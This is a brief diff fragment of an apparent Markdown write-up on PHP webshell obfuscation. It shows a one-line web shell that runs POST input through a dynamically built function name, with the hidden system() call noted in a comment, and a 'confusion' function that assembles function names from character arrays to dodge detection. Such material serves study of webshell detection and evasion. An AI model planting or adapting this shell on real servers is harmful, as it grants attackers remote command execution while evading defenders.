@@ -948,7 +948,7 @@ $f($_POST['aabyss']);           //sysTem($_POST['aabyss']);
 
 ```php
 function confusion($a){
-    $s = ['a','t','s', 'y', 'm', 'e', '/'];
+    $s = ['A','a','b', 'y', 's', 's', 'T', 'e', 'a', 'm'];
     $tmp = "";
     while ($a>10) {
         $tmp .= $s[$a%10];
